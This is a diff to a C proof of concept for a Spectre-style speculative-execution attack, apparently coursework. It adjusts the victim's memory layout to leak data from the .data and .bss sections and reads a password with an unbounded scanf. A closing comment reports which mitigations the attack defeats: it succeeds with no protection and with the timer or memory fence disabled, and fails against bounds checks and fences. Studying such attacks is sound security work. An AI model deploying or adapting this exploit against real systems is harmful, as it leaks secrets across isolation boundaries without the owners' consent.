@@ -42,13 +42,15 @@
 
 // inited gose to data, uninited gose to bss
 enum Mode {TEXT = 1, DATA = 2, BSS = 3};
-enum Mode mode = TEXT;
+enum Mode mode = BSS;
 
 /********************************************************************
 Victim code.
 ********************************************************************/
 unsigned int array1_size = 16;
-volatile uint8_t data_base_data[33] = 
+
+// added char a before data to make sure compiler reorder put this in lowest address
+volatile uint8_t adata_base_data[33] = 
   {0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 
   0x74, 0x68, 0x65, 0x20, 0x62, 0x61, 0x73, 0x65, 
   0x20, 0x6F, 0x66, 0x20, 0x64, 0x61, 0x74, 0x61, 
@@ -74,16 +76,18 @@ uint8_t array1[16] = {
 };
 
 // approx. base address of .text .data and .bss section
-//volatile uint8_t* data_base = &data_base_data;
-volatile uint8_t* data_base = data_base_data;
-volatile uint8_t bss_base[16];
+//volatile uint8_t* data_base = &adata_base_data;
+volatile uint8_t* data_base = adata_base_data;
+volatile uint8_t a[16];   // used trival name as a because compiler reorders them, 
+                          // a is lowest
+volatile uint8_t* bss_base = a;
 volatile char* text_base = "this is the base of text -ish";
 
 /////////////////////////////////////////////
 /* victm can be placed anywhere below here */
 
 
-char ui[256];
+char asddffdfd[256];
 
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
@@ -347,13 +351,13 @@ int main(int argc,
   printf("data base is   : %p\n", data_base);
   printf("arr1 base is   : %p\n", array1);
   printf("bss base is    : %p\n", bss_base);
-  printf("ui base is     : %p\n", ui);
+  printf("ui base is     : %p\n", asddffdfd);
   
   /* Default addresses to read is 40 (which is the length of the secret string) */
   int len = 100;
 
   printf ("Enter your password: ");
-  scanf ("%s", ui);
+  scanf ("%s", asddffdfd);
 
   
   int score[2];
@@ -456,8 +460,22 @@ int main(int argc,
 /*
 
 Tested on Columbia ECE server
-No protection: all correct
-enable fence protection: Nope
-enable 
+No protection: hack succeed
 
+enable secure boundary check: hack failed
+
+enable fence protection: hack failed
+
+enable BP protection: return gibbrish with high confidence
+                      means successfully read data, but from random location
+
+disable accurate timer: required some fine-tuning on the parameters
+                        but hack succeed
+
+disable memory fence:   hack succeed
+
+disable memory flush:   must manually load/store to flush
+                        very slow hack, very slow parameter-tuning
+                        I gave up, (not a fail, but not success either)
+very old machine (pentium era):  same as above
 */
